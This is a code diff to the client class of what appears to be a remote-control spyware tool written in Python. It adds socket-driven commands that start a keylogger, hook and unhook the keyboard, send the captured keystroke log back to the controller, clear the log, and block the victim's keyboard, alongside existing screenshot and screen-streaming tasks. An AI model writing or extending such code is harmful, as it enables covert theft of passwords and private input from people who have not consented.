@@ -100,7 +100,10 @@ class Client(Socket, threading.Thread):
     def __init__(self, socket, addr, DELIM=b'\x00'):
         Socket.__init__(self, socket=socket, DELIM=DELIM)
         threading.Thread.__init__(self, name=addr)
+        self.listener = None
+
         DEBUG("new client", addr)
+
 
     def stop(self):
         try:
@@ -119,6 +122,39 @@ class Client(Socket, threading.Thread):
     def task_screen_capture(self):
         self.send_obj(utils.take_screenshot())
         DEBUG("sent screenshot")
+
+    def task_keyboard_start(self):
+        self.listener = keyboard.Keylogger()
+        self.listener.start()
+
+    def task_keyboard_stop(self):
+        if self.listener is not None:
+            self.listener.stop()
+            self.listener = None
+
+    def task_keyboard_hook(self):
+        if self.listener is not None:
+            self.listener.hook_keyboard()
+
+    def task_keyboard_unhook(self):
+        if self.listener is not None:
+            self.listener.unhook_keyboard()
+
+    def task_keyboard_get_log(self):
+        if self.listener is not None:
+            self.send_str(self.listener.get_log())
+
+    def task_keyboard_clear_log(self):
+        if self.listener is not None:
+            self.listener.clear_log()
+
+    def task_keyboard_block(self):
+        if self.listener is not None:
+            self.listener.block_keyboard()
+    
+    def task_keyboard_unblock(self):
+        if self.listener is not None:
+            self.listener.unblock_keyboard()
     
     def run(self):
         while True:
@@ -132,16 +168,24 @@ class Client(Socket, threading.Thread):
                 self.task_screen_stream()
             elif flag == 'screen-capture':
                 self.task_screen_capture()
+            elif flag == 'listener-start':
+                self.task_keyboard_start()
+            elif flag == 'listener-stop':
+                self.task_keyboard_stop()
             elif flag == 'listener-hook':
-                self.listener = keyboard.Keylogger()
-                self.listener.start()
+                self.task_keyboard_hook()
             elif flag == 'listener-unhook':
-                self.listener.stop()
+                self.task_keyboard_unhook()
             elif flag == 'listener-get':
-                self.send_str(self.listener.get_log())
+                self.task_keyboard_get_log()
             elif flag == 'listener-clear':
-                self.listener.clear_log()
-
-
+                self.task_keyboard_clear_log()
+            elif flag == 'listener-block':
+                self.task_keyboard_block()
+            elif flag == 'listener-unblock':
+                self.task_keyboard_unblock()
+            else:
+                DEBUG("unknown flag", flag)
+    
 def DEBUG(*args,**kwargs):
     print("Server:", *args,**kwargs)
